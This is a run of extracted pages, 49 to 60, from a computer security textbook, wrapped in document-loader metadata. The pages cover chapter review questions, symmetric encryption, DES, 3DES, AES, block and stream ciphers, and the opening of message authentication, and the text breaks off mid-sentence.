       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 50, 'page_label': '49'}, page_content='1.8 / KEY TERMS, REviEw QUESTiONS, AND PROBLEMS  49\\n• Internet Society: ISOC is a pr ofessional membership society with worldwide \\norganizational and individual membership. It provides leadership in addressing \\nissues that confront the future of the Internet, and is the organization home \\nfor the groups responsible for Internet infrastructure standards, including the \\nInternet Engineering Task Force (IETF) and the Internet Architecture Board \\n(IAB). These organizations develop Internet standards and related specifica -\\ntions, all of which are published as Requests for Comments (RFCs).\\n• ITU-T: The International Telecommunication Union (ITU) is a United Nations \\nagency in which governments and the private sector coordinate global telecom \\nnetworks and services. The ITU Telecommunication Standardization Sector \\n(ITU-T) is one of the three sectors of the ITU. ITU-T’s mission is the produc-\\ntion of standards covering all fields of telecommunications. ITU-T standards \\nare referred to as Recommendations.\\n• ISO: The International Organization for Standardization (ISO) is a worldwide \\nfederation of national standards bodies from more than 140 countries. ISO is a \\nnongovernmental organization that promotes the development of standardiza-\\ntion and related activities with a view to facilitating the international exchange \\nof goods and services, and to developing cooperation in the spheres of intel -\\nlectual, scientific, technological, and economic activity. ISO’s work results in \\ninternational agreements that are published as International Standards.\\n A more detailed discussion of these organizations is contained in Appendix C. \\nA list of ISO and NIST documents referenced in this book is provided at the \\nend of the book.\\n 1.8 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\naccess control\\nactive attack\\nadversary\\nasset\\nassurance\\nattack\\nattack surface\\nattack tree\\nauthentication\\nauthenticity\\navailability\\ncomplete mediation\\nconfidentiality\\ncorruption\\ncountermeasure\\ndata confidentiality\\ndata integrity\\ndenial of service\\ndisruption\\neconomy of mechanism\\nencapsulation\\nencryption\\nevaluation\\nexposure\\nfail-safe defaults\\nfalsification\\nincapacitation\\ninference\\ninside attack\\nintegrity\\ninterceptions\\nintrusion\\nisolation\\nlayering\\nleast astonishment\\nleast common mechanism\\nleast privilege\\nmasquerade\\nmisappropriation\\nmisuse\\nmodularity\\nnonrepudiation\\nobstruction\\nopen design\\nOSI security architecture\\n(Continued)\\nM01_STAL0611_04_GE_C01.indd   49 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 51, 'page_label': '50'}, page_content='50  CHAPTER 1 / OvERviEw\\nReview Questions\\n 1.1 What is meant by the CIA triad?.\\n 1.2 What is the difference between data integrity and system integrity?\\n 1.3 List and briefly define the kinds of threat consequences and the types of threat actions \\nwhich cause these consequences.\\n 1.4 List and briefly define the fundamental security design principles.\\n 1.5 What is a security policy? What are the actions involved when implementing a secu -\\nrity policy?\\n 1.6 Differentiate between a network attack surface and a software attack surface.\\nProblems\\n 1.1 Consider a student information system (SIS) in which students provide a university \\nstudent number (USN) and a card for account access. Give examples of confidential-\\nity, integrity, and availability requirements associated with the system and, in each \\ncase, indicate the degree of the importance of the requirement.\\n 1.2 Repeat Problem 1.1 for a network routing system that routes data packets through a \\nnetwork based on the IP address provided by the sender.\\n 1.3 Consider a desktop publishing system used to produce documents for v arious \\norganizations.\\na. Give an example of a type of publication for which confidentiality of the stored \\ndata is the most important requirement.\\nb. Give an example of a type of publication in which data integrity is the most impor-\\ntant requirement.\\nc. Give an example in which system availability is the most important requirement.\\n 1.4 For each of the following assets , assign a low, moderate, or high impact level for the \\nloss of confidentiality, availability, and integrity, respectively. Justify your answers.\\na. An organization managing public information on its Web server.\\nb. A la w enforcement organization managing extremely sensitive investigative \\ninformation.\\nc. A financial organization managing routine administrative information (not privacy-\\nrelated information).\\nd. An information system used for large acquisitions in a contr acting organization \\ncontains both sensitive, pre-solicitation phase contract information and routine \\nadministrative information. Assess the impact for the two data sets separately and \\nthe information system as a whole.\\ne. A power plant contains a SCADA (supervisory control and data acquisition) sys-\\ntem controlling the distribution of electric power for a large military installation. \\nThe SCADA system contains both real-time sensor data and routine administra -\\ntive information. Assess the impact for the two data sets separately and the infor-\\nmation system as a whole.\\noutside attack\\npassive attack\\nprevent\\nprivacy\\npsychological acceptability\\nreplay\\nrepudiation\\nrisk\\nsecurity attack\\nsecurity mechanism\\nsecurity policy\\nsecurity service\\nseparation of privilege\\nsystem integrity\\nsystem resource\\nthreat agent\\ntraffic analysis\\nunauthorized disclosure\\nusurpation\\nvulnerabilities\\nM01_STAL0611_04_GE_C01.indd   50 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 52, 'page_label': '51'}, page_content='1.8 / KEY TERMS, REviEw QUESTiONS, AND PROBLEMS  51\\n 1.5 Consider the following general code for allowing access to a resource:\\nDWORD dwRet = IsAccessAllowed(...);\\nif (dwRet == ERROR_ACCESS_DENIED) {\\n// Security check failed.\\n// Inform user that access is denied.\\n} else {\\n// Security check OK.\\n}\\na. Explain the security flaw in this program.\\nb. Rewrite the code to avoid the flaw.\\nHint: Consider the design principle of fail-safe defaults.\\n 1.6 Develop an attack tree for gaining access to the contents of a physical safe.\\n 1.7 Consider a company whose operations ar e housed in two buildings on the same \\n property: one building is headquarters, the other building contains network and com-\\nputer services. The property is physically protected by a fence around the perimeter. \\nThe only entrance to the property is through a guarded front gate. The local networks \\nare split between the Headquarters’ LAN and the Network Services’ LAN. Internet \\nusers connect to the Web server through a firewall. Dial-up users get access to a par-\\nticular server on the Network Services’ LAN. Develop an attack tree in which the root \\nnode represents disclosure of proprietary secrets. Include physical, social engineering, \\nand technical attacks. The tree may contain both AND and OR nodes. Develop a tree \\nthat has at least 15 leaf nodes.\\n 1.8 Read all of the classic papers cited in the Recommended Reading document at http://\\nwilliamstallings.com/ComputerSecurity/ Compose a 500–1000 word paper (or\\xa0 8–12 \\nslide presentation) that summarizes the key concepts that emerge from these papers, \\nemphasizing concepts that are common to most or all of the papers.\\nM01_STAL0611_04_GE_C01.indd   51 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 53, 'page_label': '52'}, page_content='52\\nCryptographic Tools\\n CHAPTER\\nPart One:  Computer  Security \\nTechnology and \\nPrinciples\\n2.1 Confidentiality with Symmetric Encryption\\nSymmetric Encryption\\nSymmetric Block Encryption Algorithms\\nStream Ciphers\\n2.2 Message Authentication and Hash Functions\\nAuthentication Using Symmetric Encryption\\nMessage Authentication without Message Encryption\\nSecure Hash Functions\\nOther Applications of Hash Functions\\n2.3 Public-Key Encryption\\nPublic-Key Encryption Structure\\nApplications for Public-Key Cryptosystems\\nRequirements for Public-Key Cryptography\\nAsymmetric Encryption Algorithms\\n2.4 Digital Signatures and Key Management\\nDigital Signature\\nPublic-Key Certificates\\nSymmetric Key Exchange Using Public-Key Encryption\\nDigital Envelopes\\n2.5 Random and Pseudorandom Numbers\\nThe Use of Random Numbers\\nRandom versus Pseudorandom\\n2.6 Practical Application: Encryption of Stored Data\\n2.7 Key Terms, Review Questions, and Problems\\nM02_STAL0611_04_GE_C02.indd   52 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 54, 'page_label': '53'}, page_content='2.1 / ConfidenTialiTy wiTh SymmeTriC enCryPTion  53\\nAn important element in many computer security services and applications is the \\nuse of cryptographic algorithms. This chapter provides an overview of the various \\ntypes of algorithms, together with a discussion of their applicability. For each type of \\nalgorithm, we will introduce the most important standardized algorithms in common \\nuse. For the technical details of the algorithms themselves, see Part Four.\\nWe begin with symmetric encryption, which is used in the widest variety of \\ncontexts, primarily to provide confidentiality. Next, we examine secure hash functions \\nand discuss their use in message authentication. The next section examines public-\\nkey encryption, also known as asymmetric encryption. We then discuss the two most \\nimportant applications of public-key encryption, namely digital signatures and key \\nmanagement. In the case of digital signatures, asymmetric encryption and secure hash \\nfunctions are combined to produce an extremely useful tool.\\nFinally, in this chapter, we provide an example of an application area for cryp-\\ntographic algorithms by looking at the encryption of stored data.\\n 2.1 CONFIDENTIALITY WITH SYMMETRIC ENCRYPTION\\nThe universal technique for providing confidentiality for transmitted or stored data \\nis symmetric encryption. This section introduces the basic concept of symmetric \\nencryption. This is followed by an overview of the two most important  symmetric \\nencryption algorithms:  the Data Encryption Standard (DES) and the Advanced \\nEncryption Standard (AES), which are block encryption algorithms. Finally, this \\nsection introduces the concept of symmetric stream encryption algorithms.\\nSymmetric Encryption\\nSymmetric encryption, also referred to as conventional encryption or single-key \\nencryption, was the only type of encryption in use prior to the introduction of public-\\nkey encryption in the late 1970s. Countless individuals and groups, from Julius Caesar \\nto the German U-boat force to present-day diplomatic, military, and commercial users, \\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Explain the basic operation of symmetric block encryption algorithms.\\n ◆ Compare and contrast block encryption and stream encryption.\\n ◆ Discuss the use of secure hash functions for message authentication.\\n ◆ List other applications of secure hash functions.\\n ◆ Explain the basic operation of asymmetric block encryption algorithms.\\n ◆ Present an overview of the digital signature mechanism and explain the \\n concept of digital envelopes.\\n ◆ Explain the significance of random and pseudorandom numbers in \\ncryptography.\\nM02_STAL0611_04_GE_C02.indd   53 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 55, 'page_label': '54'}, page_content='54  ChaPTer 2 / CryPTograPhiC ToolS\\nhave used symmetric encryption for secret communication. It remains the more widely \\nused of the two types of encryption.\\nA symmetric encryption scheme has five ingredients (see Figure 2.1):\\n• Plaintext: This is the original message or data that is fed into the algorithm as \\ninput.\\n• Encryption algorithm:  The encryption algorithm performs various substitu-\\ntions and transformations on the plaintext.\\n• Secret key: The secret key is also input to the encryption algorithm. The exact \\nsubstitutions and transformations performed by the algorithm depend on \\nthe\\xa0key.\\n• Ciphertext: This is the scrambled message produced as output. It depends on \\nthe plaintext and the secret key. For a given message, two different keys will \\nproduce two different ciphertexts.\\n• Decryption algorithm:  This is essentially the encryption algorithm run in \\nreverse. It takes the ciphertext and the secret key and produces the original \\nplaintext.\\nThere are two requirements for secure use of symmetric encryption:\\n1. We need a strong encryption algorithm. At a minimum, we would like the algo-\\nrithm to be such that an opponent who knows the algorithm and has access to one \\nor more ciphertexts would be unable to decipher the ciphertext or figure out the \\nkey. This requirement is usually stated in a stronger form: The opponent should be \\nunable to decrypt ciphertext or discover the key even if he or she is in possession of \\na number of ciphertexts together with the plaintext that produced each ciphertext.\\n2. The sender and receiver must have obtained copies of the secret key in a secure \\nfashion and must keep the key secure. If someone can discover the key and \\nknows the algorithm, all communication using this key is readable.\\nThere are two general approaches to attacking a symmetric encryption scheme. \\nThe first attack is known as cryptanalysis. Cryptanalytic attacks rely on the nature \\nof the algorithm plus perhaps some knowledge of the general characteristics of the \\nplaintext, or even some sample plaintext-ciphertext pairs. This type of attack exploits \\nthe characteristics of the algorithm to attempt to deduce a specific plaintext or to \\nFigure 2.1 Simplified Model of Symmetric Encryption\\nPlaintext\\ninput\\nTransmitted\\nciphertext\\nPlaintext\\noutput\\nSecret key shared by\\nsender and recipient\\nSecret key shared by\\nsender and recipient\\nEncryption algorithm\\n(e.g., DES)\\nDecryption algorithm\\n(reverse of encryption\\nalgorithm)\\nK\\nX\\nY E[ K ,  X] X D[ K ,  Y]\\nK\\nM02_STAL0611_04_GE_C02.indd   54 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 56, 'page_label': '55'}, page_content='2.1 / ConfidenTialiTy wiTh SymmeTriC enCryPTion  55\\ndeduce the key being used. If the attack succeeds in deducing the key, the effect is \\ncatastrophic: All future and past messages encrypted with that key are compromised.\\nThe second method, known as the brute-force attack, is to try every possible key \\non a piece of ciphertext until an intelligible translation into plaintext is obtained. On \\naverage, half of all possible keys must be tried to achieve success. That is, if there are \\nx different keys, on average an attacker would discover the actual key after x/2 tries. \\nThere is more to a brute-force attack than simply running through all possible keys. \\nUnless known plaintext is provided, the analyst must be able to recognize plaintext \\nas plaintext. If the message is just plain text in English, then the result pops out eas-\\nily, although the task of recognizing English would have to be automated. If the text \\nmessage has been compressed before encryption, then recognition is more difficult. \\nAnd if the message is some more general type of data, such as a numerical file, and \\nthis has been compressed, the problem becomes even more difficult to automate. \\nThus, to supplement the brute-force approach, some degree of knowledge about \\nthe expected plaintext is needed, and some means of automatically distinguishing \\nplaintext from garble is also needed.\\nSymmetric Block Encryption Algorithms\\nThe most commonly used symmetric encryption algorithms are block ciphers. A\\xa0block \\ncipher processes the plaintext input in fixed-size blocks and produces a block of \\nciphertext of equal size for each plaintext block. The algorithm processes longer \\nplaintext amounts as a series of fixed-size blocks. The most important symmetric algo-\\nrithms, all of which are block ciphers, are the Data Encryption Standard (DES), triple \\nDES, and the Advanced Encryption Standard (AES); see Table 2.1. This subsection \\nprovides an overview of these algorithms. Chapter 20 will present the technical details.\\nData Encryption StanDarD Until recently, the most widely used encryption \\nscheme was based on the Data Encryption Standard (DES) adopted in 1977 by the \\nNational Bureau of Standards, now the National Institute of Standards and Tech -\\nnology (NIST), as FIPS PUB 46 ( Data Encryption Standard , January 1977).1 The \\nalgorithm itself is referred to as the Data Encryption Algorithm (DEA). DES takes a \\nplaintext block of 64 bits and a key of 56 bits, to produce a ciphertext block of 64 bits.\\nConcerns about the strength of DES fall into two categories: concerns about the \\nalgorithm itself, and concerns about the use of a 56-bit key. The first concern refers to \\n1See Appendix C for more information on NIST and similar organizations, and the “List of NIST and ISO \\nDocuments” for related publications that we discuss.\\nDES Triple DES AES\\nPlaintext block size (bits) 64 64 128\\nCiphertext block size (bits) 64 64 128\\nKey size (bits) 56 112 or 168 128, 192, or 256\\nDES = Data Encryption Standard\\nAES = Advanced Encryption Standard\\nTable 2.1 Comparison of Three Popular Symmetric Encryption Algorithms\\nM02_STAL0611_04_GE_C02.indd   55 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 57, 'page_label': '56'}, page_content='56  ChaPTer 2 / CryPTograPhiC ToolS\\nthe possibility that cryptanalysis is possible by exploiting the characteristics of the DES \\nalgorithm. Over the years, there have been numerous attempts to find and exploit weak-\\nnesses in the algorithm, making DES the most-studied encryption algorithm in existence. \\nDespite numerous approaches, no one has so far reported a fatal weakness in DES.\\nA more serious concern is key length. With a key length of 56 bits, there are 256 \\npossible keys, which is approximately 7.2 * 1016 keys. Given the speed of commercial \\noff-the-shelf processors, this key length is woefully inadequate. A paper from Seagate \\nTechnology [SEAG08] suggests that a rate of one billion (109) key combinations per \\nsecond is reasonable for today’s multicore computers. Recent offerings confirm this. \\nBoth Intel and AMD now offer hardware-based instructions to accelerate the use \\nof AES. Tests run on a contemporary multicore Intel machine resulted in an encryp-\\ntion rate of about half a billion encryptions per second [BASU12]. Another recent \\nanalysis suggests that with contemporary supercomputer technology, a rate of 1013 \\nencryptions/s is reasonable [AROR12].\\nWith these results in mind, Table 2.2 shows how much time is required for a \\nbrute-force attack for various key sizes. As can be seen, a single PC can break DES in \\nabout a year; if multiple PCs work in parallel, the time is drastically shortened. And \\ntoday’s supercomputers should be able to find a key in about an hour. Key sizes of \\n128 bits or greater are effectively unbreakable using simply a brute-force approach. \\nEven if we managed to speed up the attacking system by a factor of 1 trillion (1012), \\nit would still take over 100,000 years to break a code using a 128-bit key.\\nFortunately, there are a number of alternatives to DES, the most important of \\nwhich are triple DES and AES, discussed in the remainder of this section.\\ntriplE DES The life of DES was extended by the use of triple DES (3DES), which \\ninvolves repeating the basic DES algorithm three times, using either two or three \\nunique keys, for a key size of 112 or 168 bits. 3DES was first standardized for use in \\nfinancial applications in ANSI standard X9.17 in 1985. 3DES was incorporated as \\npart of the Data Encryption Standard in 1999, with the publication of FIPS PUB 46-3.\\n3DES has two attractions that assure its widespread use over the next few \\nyears. First, with its 168-bit key length, it overcomes the vulnerability to brute-force \\nattack of DES. Second, the underlying encryption algorithm in 3DES is the same as \\nin DES. This algorithm has been subjected to more scrutiny than any other encryption \\nalgorithm over a longer period of time, and no effective cryptanalytic attack based \\non the algorithm rather than brute force has been found. Accordingly, there is a high \\nKey Size \\n(bits) Cipher\\nNumber of \\nAlternative Keys\\nTime Required at \\n109 decryptions/Ms\\nTime Required at \\n1013 decryptions/Ms\\n56 DES 256 /uni22487.2 * 1016 255 ms = 1.125 years 1 hour\\n128 AES 2128 /uni22483.4 * 1038 2127 ms = 5.3 * 1021 years 5.3 * 1017 years\\n168 Triple DES 2168 /uni22483.7 * 1050 2167 ms = 5.8 * 1033 years 5.8 * 1029 years\\n192 AES 2192 /uni22486.3 * 1057 2191 ms = 9.8 * 1040 years 9.8 * 1036 years\\n256 AES 2256 /uni22481.2 * 1077 2255 ms = 1.8 * 1060 years 1.8 * 1056 years\\nTable 2.2 Average Time Required for Exhaustive Key Search\\nM02_STAL0611_04_GE_C02.indd   56 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 58, 'page_label': '57'}, page_content='2.1 / ConfidenTialiTy wiTh SymmeTriC enCryPTion  57\\nlevel of confidence that 3DES is very resistant to cryptanalysis. If security were the \\nonly consideration, then 3DES would be an appropriate choice for a standardized \\nencryption algorithm for decades to come.\\nThe principal drawback of 3DES is that the algorithm is relatively sluggish in \\nsoftware. The original DES was designed for mid-1970s hardware implementation \\nand does not produce efficient software code. 3DES, which requires three times as \\nmany calculations as DES, is correspondingly slower. A secondary drawback is that \\nboth DES and 3DES use a 64-bit block size. For reasons of both efficiency and secu-\\nrity, a larger block size is desirable.\\naDvancED Encryption StanDarD Because of its drawbacks, 3DES is not a rea-\\nsonable candidate for long-term use. As a replacement, NIST in 1997 issued a call \\nfor proposals for a new Advanced Encryption Standard (AES), which should have a \\nsecurity strength equal to or better than 3DES and significantly improved efficiency. \\nIn addition to these general requirements, NIST specified that AES must be a sym-\\nmetric block cipher with a block length of 128 bits and support for key lengths of \\n128, 192, and 256 bits. Evaluation criteria included security, computational efficiency, \\nmemory requirements, hardware and software suitability, and flexibility.\\nIn a first round of evaluation, 15 proposed algorithms were accepted. A sec -\\nond round narrowed the field to 5 algorithms. NIST completed its evaluation process \\nand published the final standard as FIPS PUB 197 (Advanced Encryption Standard, \\nNovember 2001). NIST selected Rijndael as the proposed AES algorithm. AES is now \\nwidely available in commercial products. AES will be described in detail in Chapter 20.\\npractical SEcurity iSSuES Typically, symmetric encryption is applied to a unit of \\ndata larger than a single 64-bit or 128-bit block. E-mail messages, network packets, \\ndatabase records, and other plaintext sources must be broken up into a series of fixed-\\nlength block for encryption by a symmetric block cipher. The simplest approach to \\nmultiple-block encryption is known as electronic codebook (ECB) mode, in which \\nplaintext is handled b bits at a time and each block of plaintext is encrypted using the \\nsame key. Typically b = 64 or b = 128. Figure 2.2a shows the ECB mode. A plain text \\nof length nb is divided into n b-bit blocks (P1, P2, c, Pn). Each block is encrypted \\nusing the same algorithm and the same encryption key, to produce a sequence of  \\nn b-bit blocks of ciphertext (C1, C2, c, Cn).\\nFor lengthy messages, the ECB mode may not be secure. A cryptanalyst may be \\nable to exploit regularities in the plaintext to ease the task of decryption. For example, \\nif it is known that the message always starts out with certain predefined fields, then the \\ncryptanalyst may have a number of known plaintext-ciphertext pairs with which to work.\\nTo increase the security of symmetric block encryption for large sequences \\nof data, a number of alternative techniques have been developed, called modes of \\noperation. These modes overcome the weaknesses of ECB; each mode has its own \\nparticular advantages. This topic will be explored in Chapter 20.\\nStream Ciphers\\nA block cipher processes the input one block of elements at a time, producing an \\noutput block for each input block. A stream cipher processes the input elements con-\\ntinuously, producing output one element at a time, as it goes along. Although block \\nM02_STAL0611_04_GE_C02.indd   57 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 59, 'page_label': '58'}, page_content='58  ChaPTer 2 / CryPTograPhiC ToolS\\nciphers are far more common, there are certain applications in which a stream cipher \\nis more appropriate. Examples will be given subsequently in this book.\\nA typical stream cipher encrypts plaintext one byte at a time, although a stream \\ncipher may be designed to operate on one bit at a time or on units larger than a byte \\nat a time. Figure 2.2b is a representative diagram of stream cipher structure. In this \\nstructure, a key is input to a pseudorandom bit generator that produces a stream \\nof 8-bit numbers that are apparently random. A pseudorandom stream is one that \\nis unpredictable without knowledge of the input key and which has an apparently \\nrandom character (see Section 2.5). The output of the generator, called a keystream, \\nFigure 2.2 Types of Symmetric Encryption\\n(b) Stream encryption\\nPseudorandom byte\\ngenerator\\n(key stream generator)\\nPlaintext\\nbyte stream\\nM\\nKey\\nK\\nKey\\nK\\nk\\nPlaintext\\nbyte stream\\nM\\nCiphertext\\nbyte stream\\nCENCRYPTION\\nPseudorandom byte\\ngenerator\\n(key stream generator)\\nDECRYPTION\\nk\\n(a) Block cipher encryption (electronic codebook mode)\\nDecryption Encryption\\nK\\nP1 P2 Pn\\nC1 C2 Pn\\nC1 C2 Cn\\nP1 P2 Pn\\nt p y r c n Et p y r c n Et p y r c n E\\nt p y r c e Dt p y r c e Dt p y r c e DK K\\nK K\\nK\\nb\\nb\\nb\\nb\\nb\\nb\\nb\\nb\\nb\\nb\\nb\\nb\\nM02_STAL0611_04_GE_C02.indd   58 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 60, 'page_label': '59'}, page_content='2.2 / meSSage auThenTiCaTion and haSh funCTionS  59\\nis combined one byte at a time with the plaintext stream using the bitwise exclusive-\\nOR (XOR) operation.\\nWith a properly designed pseudorandom number generator, a stream cipher \\ncan be as secure as a block cipher of comparable key length. The primary advantage \\nof a stream cipher is that stream ciphers are almost always faster and use far less code \\nthan do block ciphers. The advantage of a block cipher is that you can reuse keys. For \\napplications that require encryption/decryption of a stream of data, such as over a \\ndata communications channel or a browser/Web link, a stream cipher might be the \\nbetter alternative. For applications that deal with blocks of data, such as file transfer, \\ne-mail, and database, block ciphers may be more appropriate. However, either type \\nof cipher can be used in virtually any application.\\n 2.2 MESSAGE AUTHENTICATION AND HASH FUNCTIONS\\nEncryption protects against passive attack (eavesdropping). A different requirement \\nis to protect against active attack (falsification of data and transactions). Protection \\nagainst such attacks is known as message or data authentication.\\nA message, file, document, or other collection of data is said to be authentic \\nwhen it is genuine and came from its alleged source. Message or data authentication \\nis a procedure that allows communicating parties to verify that received or stored \\nmessages are authentic.2 The two important aspects are to verify that the contents of \\nthe message have not been altered and that the source is authentic. We may also wish \\nto verify a message’s timeliness (it has not been artificially delayed and replayed) and \\nsequence relative to other messages flowing between two parties. All of these con -\\ncerns come under the category of data integrity, as was described in Chapter 1.\\nAuthentication Using Symmetric Encryption\\nIt would seem possible to perform authentication simply by the use of symmetric \\nencryption. If we assume that only the sender and receiver share a key (which is \\nas it should be), then only the genuine sender would be able to encrypt a mes -\\nsage successfully for the other participant, provided the receiver can recognize a \\nvalid message. Furthermore, if the message includes an error-detection code and a \\nsequence number, the receiver is assured that no alterations have been made and \\nthat sequencing is proper. If the message also includes a timestamp, the receiver is \\nassured that the message has not been delayed beyond that normally expected for \\nnetwork transit.\\nIn fact, symmetric encryption alone is not a suitable tool for data authentication. \\nTo give one simple example, in the ECB mode of encryption, if an attacker reorders \\nthe blocks of ciphertext, then each block will still decrypt successfully. However, the \\nreordering may alter the meaning of the overall data sequence. Although sequence \\nnumbers may be used at some level (e.g., each IP packet), it is typically not the case \\nthat a separate sequence number will be associated with each b-bit block of plaintext. \\nThus, block reordering is a threat.\\n2For simplicity, for the remainder of this section, we refer to message authentication. By this, we mean both \\nauthentication of transmitted messages and of stored data (data authentication).\\nM02_STAL0611_04_GE_C02.indd   59 10/11/17   2:42 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 61, 'page_label': '60'}, page_content='60  ChaPTer 2 / CryPTograPhiC ToolS\\nMessage Authentication without Message Encryption\\nIn this section, we examine several approaches to message authentication that do \\nnot rely on message encryption. In all of these approaches, an authentication tag \\nis generated and appended to each message for transmission. The message itself is \\nnot encrypted and can be read at the destination independent of the authentication \\nfunction at the destination.\\nBecause the approaches discussed in this section do not encrypt the message, \\nmessage confidentiality is not provided. As was mentioned, message encryption by \\nitself does not provide a secure form of authentication. However, it is possible to com-\\nbine authentication and confidentiality in a single algorithm by encrypting a message \\nplus its authentication tag. Typically, however, message authentication is provided as \\na separate function from message encryption. [DA VI89] suggests three situations in \\nwhich message authentication without confidentiality is preferable:\\n1. There are a number of applications in which the same message is broadcast to \\na number of destinations. Two examples are notification to users that the net-\\nwork is now unavailable, and an alarm signal in a control center. It is cheaper \\nand more reliable to have only one destination responsible for monitoring \\nauthenticity. Thus, the message must be broadcast in plaintext with an associ -\\nated message authentication tag. The responsible system performs authen -\\ntication. If a violation occurs, the other destination systems are alerted by a \\ngeneral alarm.\\n2. Another possible scenario is an exchange in which one side has a heavy load and \\ncannot afford the time to decrypt all incoming messages. Authentication is carried \\nout on a selective basis, with messages being chosen at random for checking.\\n3. Authentication of a computer program in plaintext is an attractive service. The \\ncomputer program can be executed without having to decrypt it every time, \\nwhich would be wasteful of processor resources. However, if a message authen-\\ntication tag were attached to the program, it could be checked whenever assur-\\nance is required of the integrity of the program.\\nThus, there is a place for both authentication and encryption in meeting security \\nrequirements.\\nMESSagE authEntication coDE One authentication technique involves the use \\nof a secret key to 